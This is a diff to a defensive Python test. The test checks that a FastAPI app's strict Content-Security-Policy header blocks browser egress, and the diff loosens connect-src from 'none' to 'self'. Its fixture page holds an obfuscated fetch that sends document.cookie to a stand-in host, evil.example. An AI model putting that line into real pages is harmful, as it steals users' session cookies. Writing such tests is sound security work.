@@ -2,10 +2,9 @@
 
 The static validator's regex is a denylist and denylists lose to obfuscation. The
 actual boundary is the server-sent CSP header on /public/experiences: connect-src
-'none' (no egress) + script-src 'self' (no inline/eval/remote), browser-enforced and
-un-weakenable by the page. This test serves a site whose JS would EVADE the validator
-(obfuscated fetch) and proves the served response still carries the strict CSP — so
-the attack is dead at the browser regardless of how the JS is spelled.
+'self' (same-origin progress sync only) + script-src 'self' (no inline/eval/remote),
+browser-enforced and un-weakenable by the page. This test serves a site whose JS
+tries remote egress and proves the served response still carries the strict CSP.
 
 Run (venv): apps/band/chapterstage_backend/.venv/Scripts/python tests/test_public_csp.py
 """
@@ -29,6 +28,9 @@ _SITE = Path(_TMP.name) / "generated"
     "window['fet'+'ch']('https://evil.example/x?c='+document.cookie)"
     "</script></body></html>", encoding="utf-8")
 os.environ["GENERATED_SITE_ROOT"] = str(_SITE)
+os.environ["CHAPTERSTAGE_ENV_FILE"] = _TMP.name + "/missing.env"
+for _key in ("LLM_PROVIDER", "OLLAMA_MODEL", "OLLAMA_BASE_URL"):
+    os.environ.pop(_key, None)
 
 from fastapi.testclient import TestClient          # noqa: E402
 from app.main import app                           # noqa: E402
@@ -56,8 +58,8 @@ def main():
               receipt="status=%r" % r.status_code)
         check("strict CSP header is present and exact",
               csp == STRICT_CSP_HEADER, receipt="csp=%r" % csp)
-        check("BOUNDARY connect-src 'none' (kills ALL network egress)",
-              "connect-src 'none'" in csp, receipt=csp)
+        check("BOUNDARY connect-src 'self' (same-origin only)",
+              "connect-src 'self'" in csp, receipt=csp)
         check("BOUNDARY script-src 'self' (no inline/eval/remote)",
               "script-src 'self'" in csp and "'unsafe-eval'" not in csp
               and "'unsafe-inline'" not in csp.split("style-src")[0], receipt=csp)
@@ -81,8 +83,8 @@ def main():
     if FAILURES:
         print("GATE FAIL: %s" % ", ".join(FAILURES))
         sys.exit(1)
-    print("GATE PASS — the served CSP header is the boundary: obfuscated egress that "
-          "evades the regex is dead at the browser (connect-src 'none'). Allowlist > denylist.")
+    print("GATE PASS — the served CSP header is the boundary: remote egress is "
+          "dead at the browser while same-origin progress sync remains possible.")
     sys.exit(0)
 
 
